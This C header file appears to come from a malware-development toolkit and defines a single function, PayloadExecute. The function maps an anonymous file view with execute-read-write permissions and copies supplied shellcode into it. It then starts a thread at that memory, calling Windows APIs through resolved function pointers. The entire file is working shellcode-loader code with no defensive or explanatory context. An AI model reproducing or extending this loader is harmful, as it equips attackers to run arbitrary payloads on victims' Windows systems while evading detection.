#pragma once
#include "api.h"
#include <Windows.h>
#include <stdio.h>

BOOL PayloadExecute( IN OPTIONAL HANDLE hProcess,  IN OPTIONAL HANDLE hThread, IN PBYTE pShellcodeAddress, IN SIZE_T sShellcodeSize, OUT PBYTE* ppInjectionAddress, OUT OPTIONAL HANDLE* phThread ) {

	HANDLE		hMappingFile		= NULL;
	PBYTE		pMappingAddress		= NULL;

	if (!pShellcodeAddress || !sShellcodeSize || !ppInjectionAddress)
		return FALSE;

	if (!(hMappingFile = pCreateFileMappingW(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, 0x00, sShellcodeSize, NULL))) {
		printf("[!] CreateFileMappingW Failed With Error: %d \n", GetLastError());
		goto _END_OF_FUNC;
	}

	if (!(pMappingAddress = (PBYTE)MapViewOfFile(hMappingFile, FILE_MAP_WRITE | FILE_MAP_EXECUTE, 0x00, 0x00, sShellcodeSize))) {
		printf("[!] MapViewOfFile Failed With Error: %d \n", GetLastError());
		goto _END_OF_FUNC;
	}

	*ppInjectionAddress = (PBYTE)memcpy(pMappingAddress, pShellcodeAddress, sShellcodeSize);

    if (!(hThread = pCreateThread(NULL, 0x00, (LPTHREAD_START_ROUTINE)pMappingAddress, NULL, 0x00, NULL))) {
		printf("[!] CreateThread Failed With Error: %d\n", GetLastError());
		return FALSE;
	}

    if (phThread)
		*phThread = hThread;

_END_OF_FUNC:
	if (hMappingFile)
		CloseHandle(hMappingFile);
	return (*ppInjectionAddress) ? TRUE : FALSE;
}